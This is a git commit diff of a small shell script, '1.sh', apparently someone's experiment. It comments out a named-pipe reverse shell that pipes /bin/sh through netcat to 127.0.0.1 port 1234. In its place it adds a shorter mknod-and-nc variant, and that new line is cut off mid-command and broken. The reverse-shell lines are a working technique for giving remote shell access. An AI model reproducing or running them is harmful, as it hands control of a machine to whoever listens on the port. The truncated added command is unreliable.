2f3a997e33b0792c298b7a9b80a579747d7ce9af
fly2maybe <txmxidian@gmail.com>
2017-08-14 20:05:56 +0800

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,3 +1,5 @@
 touch HelloWorld
-rm /tmp/backpipe ; mknod /tmp/backpipe p
-/bin/sh 0</tmp/backpipe | nc 127.0.0.1 1234 1>/tmp/backpipe&
+#rm /tmp/backpipe ; mknod /tmp/backpipe p
+#/bin/sh 0</tmp/backpipe | nc 127.0.0.1 1234 1>/tmp/backpipe&
+
+rm -f /tmp/p; mknod /tmp/p p && nc 127.0.0.1 1234 0/tmp/
